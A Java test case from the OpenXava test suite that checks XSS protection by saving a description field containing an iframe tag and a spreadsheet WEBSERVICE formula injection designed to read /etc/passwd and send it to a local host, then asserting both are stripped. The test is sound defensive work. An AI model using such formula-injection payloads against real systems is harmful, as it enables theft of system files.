package org.openxava.test.tests.bymodule;

import org.openxava.tests.*;



/**
 * 
 * @author Javier Paniza
 */

public class SkillTest extends ModuleTestBase {
	
	public SkillTest(String testName) {
		super(testName, "Skill");		
	}
	
	public void testXSSProtection() throws Exception {
		execute("CRUD.new");
		// tmr setValue("description", "START<iframe src='http://openxava.org'/>END");
		setValue("description", "START<iframe src='http://openxava.org'/>MIDDLE=WEBSERVICE(\"http://localhost:8000/?q=\" & WEBSERVICE(\"/etc/passwd\"))END"); // tmr
		execute("CRUD.save");
		execute("Mode.list");
		assertFalse(getHtml().contains("iframe"));
		// tmr assertValueInList(1, 0, "STARTEND"); 
		assertValueInList(1, 0, "STARTMIDDLEEND");
		execute("CRUD.deleteRow", "row=1");
	}
	
}
